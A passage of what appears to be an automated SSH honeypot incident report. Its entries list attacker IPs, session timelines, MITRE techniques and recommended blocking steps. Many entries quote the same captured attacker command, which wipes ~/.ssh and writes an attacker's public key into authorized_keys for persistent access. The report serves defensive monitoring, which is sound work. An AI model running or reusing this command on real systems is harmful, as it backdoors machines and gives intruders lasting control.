| `2026-05-26 17:11:24` | `cowrie.command.failed` |
| `2026-05-26 17:11:25` | `cowrie.log.closed` |
| `2026-05-26 17:11:26` | `cowrie.session.params` |
| `2026-05-26 17:11:26` | `cowrie.command.input` |
| `2026-05-26 17:11:26` | `cowrie.session.file_download` |
| `2026-05-26 17:11:26` | `cowrie.log.closed` |
| `2026-05-26 17:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1189bf0463

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:11 |
| **Last Seen** | 2026-05-26 17:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:11:29` | `cowrie.session.connect` |
| `2026-05-26 17:11:29` | `cowrie.client.version` |
| `2026-05-26 17:11:30` | `cowrie.client.kex` |
| `2026-05-26 17:11:31` | `cowrie.login.success` |
| `2026-05-26 17:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657e56d0749b

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:12 |
| **Last Seen** | 2026-05-26 17:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:12:36` | `cowrie.session.connect` |
| `2026-05-26 17:12:36` | `cowrie.client.version` |
| `2026-05-26 17:12:37` | `cowrie.client.kex` |
| `2026-05-26 17:12:38` | `cowrie.login.success` |
| `2026-05-26 17:12:39` | `cowrie.session.params` |
| `2026-05-26 17:12:39` | `cowrie.command.input` |
| `2026-05-26 17:12:39` | `cowrie.command.failed` |
| `2026-05-26 17:12:39` | `cowrie.log.closed` |
| `2026-05-26 17:12:40` | `cowrie.session.params` |
| `2026-05-26 17:12:40` | `cowrie.command.input` |
| `2026-05-26 17:12:40` | `cowrie.session.file_download` |
| `2026-05-26 17:12:40` | `cowrie.log.closed` |
| `2026-05-26 17:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f4d6e25789

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:12 |
| **Last Seen** | 2026-05-26 17:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:12:44` | `cowrie.session.connect` |
| `2026-05-26 17:12:44` | `cowrie.client.version` |
| `2026-05-26 17:12:44` | `cowrie.client.kex` |
| `2026-05-26 17:12:45` | `cowrie.login.success` |
| `2026-05-26 17:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f68cc54614

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:17 |
| **Last Seen** | 2026-05-26 17:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:17:18` | `cowrie.session.connect` |
| `2026-05-26 17:17:18` | `cowrie.client.version` |
| `2026-05-26 17:17:18` | `cowrie.client.kex` |
| `2026-05-26 17:17:19` | `cowrie.login.success` |
| `2026-05-26 17:17:20` | `cowrie.session.params` |
| `2026-05-26 17:17:20` | `cowrie.command.input` |
| `2026-05-26 17:17:20` | `cowrie.command.failed` |
| `2026-05-26 17:17:21` | `cowrie.log.closed` |
| `2026-05-26 17:17:21` | `cowrie.session.params` |
| `2026-05-26 17:17:21` | `cowrie.command.input` |
| `2026-05-26 17:17:22` | `cowrie.session.file_download` |
| `2026-05-26 17:17:22` | `cowrie.log.closed` |
| `2026-05-26 17:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57d98f0b504c

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:17 |
| **Last Seen** | 2026-05-26 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:17:26` | `cowrie.session.connect` |
| `2026-05-26 17:17:26` | `cowrie.client.version` |
| `2026-05-26 17:17:26` | `cowrie.client.kex` |
| `2026-05-26 17:17:27` | `cowrie.login.success` |
| `2026-05-26 17:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1eea6022de8

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:06` | `cowrie.session.connect` |
| `2026-05-26 17:18:06` | `cowrie.client.version` |
| `2026-05-26 17:18:07` | `cowrie.client.kex` |
| `2026-05-26 17:18:08` | `cowrie.login.success` |
| `2026-05-26 17:18:10` | `cowrie.session.params` |
| `2026-05-26 17:18:10` | `cowrie.command.input` |
| `2026-05-26 17:18:10` | `cowrie.command.failed` |
| `2026-05-26 17:18:10` | `cowrie.log.closed` |
| `2026-05-26 17:18:11` | `cowrie.session.params` |
| `2026-05-26 17:18:11` | `cowrie.command.input` |
| `2026-05-26 17:18:11` | `cowrie.session.file_download` |
| `2026-05-26 17:18:11` | `cowrie.log.closed` |
| `2026-05-26 17:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a7b5cab4f8

| Field | Detail |
|---|---|
| **Source IP** | `190.81.117[.]162` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:15` | `cowrie.session.connect` |
| `2026-05-26 17:18:15` | `cowrie.client.version` |
| `2026-05-26 17:18:15` | `cowrie.client.kex` |
| `2026-05-26 17:18:17` | `cowrie.login.success` |
| `2026-05-26 17:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.81.117[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.81.117[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7900dcbddbc

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:18` | `cowrie.session.connect` |
| `2026-05-26 17:18:18` | `cowrie.client.version` |
| `2026-05-26 17:18:18` | `cowrie.client.kex` |
| `2026-05-26 17:18:19` | `cowrie.login.success` |
| `2026-05-26 17:18:20` | `cowrie.session.params` |
| `2026-05-26 17:18:20` | `cowrie.command.input` |
| `2026-05-26 17:18:20` | `cowrie.command.failed` |
| `2026-05-26 17:18:20` | `cowrie.log.closed` |
| `2026-05-26 17:18:20` | `cowrie.session.params` |
| `2026-05-26 17:18:20` | `cowrie.command.input` |
| `2026-05-26 17:18:21` | `cowrie.session.file_download` |
| `2026-05-26 17:18:21` | `cowrie.log.closed` |
| `2026-05-26 17:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642154bdb08f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:25` | `cowrie.session.connect` |
| `2026-05-26 17:18:25` | `cowrie.client.version` |
| `2026-05-26 17:18:25` | `cowrie.client.kex` |
| `2026-05-26 17:18:26` | `cowrie.login.success` |
| `2026-05-26 17:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6897abc1b441

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:40` | `cowrie.session.connect` |
| `2026-05-26 17:18:40` | `cowrie.client.version` |
| `2026-05-26 17:18:40` | `cowrie.client.kex` |
| `2026-05-26 17:18:41` | `cowrie.login.success` |
| `2026-05-26 17:18:41` | `cowrie.session.params` |
| `2026-05-26 17:18:41` | `cowrie.command.input` |
| `2026-05-26 17:18:41` | `cowrie.command.failed` |
| `2026-05-26 17:18:41` | `cowrie.log.closed` |
| `2026-05-26 17:18:41` | `cowrie.session.params` |
| `2026-05-26 17:18:41` | `cowrie.command.input` |
| `2026-05-26 17:18:42` | `cowrie.session.file_download` |
| `2026-05-26 17:18:42` | `cowrie.log.closed` |
| `2026-05-26 17:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764374e7471f

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-05-26 17:18 |
| **Last Seen** | 2026-05-26 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:18:44` | `cowrie.session.connect` |
| `2026-05-26 17:18:44` | `cowrie.client.version` |
| `2026-05-26 17:18:44` | `cowrie.client.kex` |
| `2026-05-26 17:18:45` | `cowrie.login.success` |
| `2026-05-26 17:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef17aedfed0e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:19 |
| **Last Seen** | 2026-05-26 17:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:19:26` | `cowrie.session.connect` |
| `2026-05-26 17:19:27` | `cowrie.client.version` |
| `2026-05-26 17:19:27` | `cowrie.client.kex` |
| `2026-05-26 17:19:28` | `cowrie.login.success` |
| `2026-05-26 17:19:29` | `cowrie.session.params` |
| `2026-05-26 17:19:29` | `cowrie.command.input` |
| `2026-05-26 17:19:29` | `cowrie.command.failed` |
| `2026-05-26 17:19:29` | `cowrie.log.closed` |
| `2026-05-26 17:19:30` | `cowrie.session.params` |
| `2026-05-26 17:19:30` | `cowrie.command.input` |
| `2026-05-26 17:19:30` | `cowrie.session.file_download` |
| `2026-05-26 17:19:30` | `cowrie.log.closed` |
| `2026-05-26 17:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf49a6439c13

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:19 |
| **Last Seen** | 2026-05-26 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:19:33` | `cowrie.session.connect` |
| `2026-05-26 17:19:33` | `cowrie.client.version` |
| `2026-05-26 17:19:33` | `cowrie.client.kex` |
| `2026-05-26 17:19:34` | `cowrie.login.success` |
| `2026-05-26 17:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdf103bc009

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:20 |
| **Last Seen** | 2026-05-26 17:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:20:34` | `cowrie.session.connect` |
| `2026-05-26 17:20:35` | `cowrie.client.version` |
| `2026-05-26 17:20:35` | `cowrie.client.kex` |
| `2026-05-26 17:20:36` | `cowrie.login.success` |
| `2026-05-26 17:20:36` | `cowrie.session.params` |
| `2026-05-26 17:20:36` | `cowrie.command.input` |
| `2026-05-26 17:20:36` | `cowrie.command.failed` |
| `2026-05-26 17:20:36` | `cowrie.log.closed` |
| `2026-05-26 17:20:37` | `cowrie.session.params` |
| `2026-05-26 17:20:37` | `cowrie.command.input` |
| `2026-05-26 17:20:37` | `cowrie.session.file_download` |
| `2026-05-26 17:20:37` | `cowrie.log.closed` |
| `2026-05-26 17:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-856813bcd6c1

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:20 |
| **Last Seen** | 2026-05-26 17:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:20:40` | `cowrie.session.connect` |
| `2026-05-26 17:20:40` | `cowrie.client.version` |
| `2026-05-26 17:20:40` | `cowrie.client.kex` |
| `2026-05-26 17:20:42` | `cowrie.login.success` |
| `2026-05-26 17:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf8c74b5e96

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:25 |
| **Last Seen** | 2026-05-26 17:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:25:09` | `cowrie.session.connect` |
| `2026-05-26 17:25:09` | `cowrie.client.version` |
| `2026-05-26 17:25:09` | `cowrie.client.kex` |
| `2026-05-26 17:25:11` | `cowrie.login.success` |
| `2026-05-26 17:25:12` | `cowrie.session.params` |
| `2026-05-26 17:25:12` | `cowrie.command.input` |
| `2026-05-26 17:25:12` | `cowrie.command.failed` |
| `2026-05-26 17:25:12` | `cowrie.log.closed` |
| `2026-05-26 17:25:13` | `cowrie.session.params` |
| `2026-05-26 17:25:13` | `cowrie.command.input` |
| `2026-05-26 17:25:13` | `cowrie.session.file_download` |
| `2026-05-26 17:25:13` | `cowrie.log.closed` |
| `2026-05-26 17:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f507bb34d3f

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-26 17:25 |
| **Last Seen** | 2026-05-26 17:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 17:25:16` | `cowrie.session.connect` |
| `2026-05-26 17:25:17` | `cowrie.client.version` |
| `2026-05-26 17:25:17` | `cowrie.client.kex` |
| `2026-05-26 17:25:18` | `cowrie.login.success` |
| `2026-05-26 17:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a30ef44328c

